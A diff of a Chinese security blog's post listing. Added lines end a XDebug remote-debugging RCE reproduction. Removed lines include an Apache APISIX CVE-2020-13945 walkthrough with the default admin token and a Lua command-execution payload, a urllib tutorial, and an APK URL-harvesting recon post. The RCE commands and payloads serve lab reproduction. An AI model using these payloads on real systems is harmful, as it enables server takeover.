+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p>
+<p>更多说明可参考：</p>
+<ul>
+<li>[[<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface/]]">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface\]]</a>(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface])(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)</li>
+<li><a target="_blank" rel="noopener" href="https://xdebug.org/">https://xdebug.org</a></li>
+</ul>
+</blockquote>
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>启动完成后，访问<code>http://192.168.44.132:8080/</code>即可发现主页是一个简单的phpinfo，在其中可以找到xdebug的配置，可见开启了远程调试。</p>
+<p><img src="/2023/12/07/XDebug-RCE/1.png" alt="image"></p>
+<p>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。</p>
+<p>我编写了一个<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">漏洞复现脚本</a>，指定目标web地址、待执行的php代码即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 要求用python3并安装requests库</span></span><br><span class="line">python3 exp.py -t http://192.168.44.132:8080/index.php -c <span class="string">&#x27;shell_exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/XDebug-RCE/2.png" alt="image"></p>
+<p><strong>重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。</strong></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XDebug/" rel="tag">XDebug</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/12/07/OS-Command-Injection/">
                 PortSwigger Academy | OS command injection 操作系统命令注入
             </a>
@@ -896,158 +1113,6 @@ Newline (0x0a or \n)
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
-                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
-            </a>
-        </h2>
-    
-    <time>
-        Dec 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
-</blockquote>
-<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
-<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
-<p>API网关又是什么？</p>
-<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
-<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
-<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
-<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
-</blockquote>
-<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
-<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
-<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>docker-compose up -d 搭建环境</p>
-<p>docker ps 查看端口为9080</p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
-<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
-<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
-<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
-</blockquote>
-<h2><span id="payload分析">payload分析</span></h2><blockquote>
-<p>查看官方文档，观察创建路由的方法</p>
-<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
-<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
-<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
-<p>接下来对lua脚本进行分析,\n是换行</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>function _M.access(conf, ctx)</strong></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
-<p><strong>assert()</strong></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
-<p><strong>read(‘a’)</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/11/08/urllib-HTTPResponse/">
-                urllib库进行网络请求后返回的HTTPResponse对象的用法总结
-            </a>
-        </h2>
-    
-    <time>
-        Nov 8, 2023
-    </time>
-    <section class="content">
-        <h1><span id="urllib库进行网络请求后返回的httpresponse对象的用法总结">urllib库进行网络请求后返回的HTTPResponse对象的用法总结</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/topleeyap/article/details/78845946">「已注销」</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>不管是使用urllib.request.urlopen()方法，还是使用opener.open()方法，都返回同样类型的HTTPResponse对象，用法总结如下:</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"> </span><br><span class="line">URL=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求头信息</span></span><br><span class="line"><span class="comment"># 反反爬虫:设置User-Agent</span></span><br><span class="line">request_headers=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求对象,并添加请求头</span></span><br><span class="line">req=request.Request(URL,headers=request_headers)</span><br><span class="line"><span class="comment"># 发起请求</span></span><br><span class="line">resp=request.urlopen(req)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(resp))   <span class="comment"># &lt;class &#x27;http.client.HTTPResponse&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 获取HTTP协议版本号(10 for HTTP/1.0, 11 for HTTP/1.1)</span></span><br><span class="line"><span class="built_in">print</span>(resp.version)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应码</span></span><br><span class="line"><span class="built_in">print</span>(resp.status)</span><br><span class="line"><span class="built_in">print</span>(resp.getcode())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应描述字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.reason)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取实际请求的页面url(防止重定向用)</span></span><br><span class="line"><span class="built_in">print</span>(resp.geturl())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取特定响应头信息</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheader(name=<span class="string">&quot;Content-Type&quot;</span>))</span><br><span class="line"><span class="comment"># 获取响应头信息,返回二元元组列表</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheaders())</span><br><span class="line"><span class="comment"># 获取响应头信息,返回字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.info())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 读取响应体</span></span><br><span class="line"><span class="built_in">print</span>(resp.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/11/08/Apktool-URL/">
-                提取APK中的URL地址
-            </a>
-        </h2>
-    
-    <time>
-        Nov 8, 2023
-    </time>
-    <section class="content">
-        <h1><span id="提取apk中的url地址">提取APK中的URL地址</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/108759583">風月长情</a> 并作补充</p>
-</blockquote>
-<h2><span id="一-目的">一、目的</span></h2><blockquote>
-<p>客户端渗透测试前期信息收集过程中可以在APK中检索开发过程中没有删掉的URL地址，在这些地址中可能会发现后台、搜索引擎、子域名查找不到的一些资源。</p>
-</blockquote>
-<h2><span id="二-操作">二、操作</span></h2><blockquote>
-<p>反编译APK文件<br><code>apktool d &lt;xxx.apk&gt;</code><br>将反编译的文件zip打包发送到linux系统中<br><img src="/2023/11/08/Apktool-URL/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>使用grep命令进行URL正则匹配<br>通过grep正则匹配包下边所有文件的uri地址，然后排序，删除重复行，最后重定向到文件中<br><code>grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /Kevin/com.sogou.map.android.maps/ |sort|uniq &gt;&gt; test.txt</code><br><img src="/2023/11/08/Apktool-URL/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>然后在搜索出来的地址中查看是否有敏感地址：<br>比如这个地址就不在我搜索的上千个子域中：<br><img src="/2023/11/08/Apktool-URL/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>随便一试直接进入后台，到此文件上传拿shell一个高危漏洞又到手了，香吧~<br><img src="/2023/11/08/Apktool-URL/4.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apktool/" rel="tag">Apktool</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
